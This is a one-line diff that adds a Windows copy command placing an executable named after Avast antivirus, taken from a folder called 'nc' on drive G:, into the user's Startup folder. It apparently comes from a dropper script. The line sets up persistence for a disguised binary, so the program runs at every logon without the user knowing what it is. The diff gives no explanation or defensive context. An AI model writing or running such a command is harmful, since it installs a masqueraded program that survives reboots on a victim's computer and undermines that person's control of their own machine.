@@ -1,0 +1,1 @@
+copy G:\nc\Avast_security.exe C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Avast_security.exe
